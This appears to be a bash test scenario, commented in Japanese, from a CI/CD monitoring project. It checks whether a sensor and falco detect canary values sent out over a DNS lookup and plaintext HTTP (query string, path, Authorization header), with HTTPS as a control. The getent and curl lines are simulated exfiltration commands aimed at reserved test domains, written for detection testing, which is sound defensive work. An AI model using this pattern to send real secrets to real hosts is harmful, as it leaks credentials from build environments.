#!/usr/bin/env bash
#
# scenarios/02-exfil.sh
#
# 用途:
#   外部送信経路ごとに、どの経路でカナリア値が「見える」状態になるかを
#   切り分ける。DNS ラベル、平文 HTTP のクエリ文字列、平文 HTTP のパス、
#   平文 HTTP の Authorization ヘッダ、そして対照群としての HTTPS を
#   それぞれ試す。
#
# 安全性 (docs/SPEC.md 1節を厳守):
#   通信先は次の2つのみ。
#     - DNS: `<CANARY_DNS>.test.invalid` (RFC 2606 予約 TLD。解決されない
#       ことが正常。第三者には到達しない)
#     - HTTP/HTTPS: `example.com` (IANA 予約ドメイン。POST 相当の内容も
#       送信しない。GET のみで、送る内容はクエリ文字列 / パス /
#       ヘッダに限る)
#   webhook 収集サービスや攻撃者インフラは一切使わない。
#
# 期待される検知内容:
#   cicd-sensor の `domain` イベント (CANARY_DNS)、`http_request` イベント
#   (CANARY_URL_PATH は payload.path に残る想定、CANARY_URL_QUERY は
#   query string 除去により残らない想定)。falco 側は process_exec /
#   network_connect 相当のイベントで curl / getent の実行と接続先を記録する
#   想定。HTTPS の対照群は「中身が取れないこと」の確認用。

set -uo pipefail

SCENARIO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/common.sh
source "${SCENARIO_DIR}/lib/common.sh"

load_canaries

step "DNS lookup of canary label under *.test.invalid (resolution failure is expected)"
safe_run getent hosts "${CANARY_DNS}.test.invalid"
end_step

step "plaintext HTTP with canary in query string"
safe_run curl -s -m 5 -o /dev/null "http://example.com/?t=${CANARY_URL_QUERY}"
end_step

step "plaintext HTTP with canary in path"
safe_run curl -s -m 5 -o /dev/null "http://example.com/${CANARY_URL_PATH}"
end_step

step "plaintext HTTP with canary in Authorization header"
safe_run curl -s -m 5 -o /dev/null \
  -H "Authorization: Bearer ${CANARY_ARGV_FLAG}" \
  "http://example.com/"
end_step

step "HTTPS control group (canary in query string; must NOT be observable in cleartext)"
safe_run curl -s -m 5 -o /dev/null "https://example.com/?t=${CANARY_URL_QUERY}"
end_step

exit 0
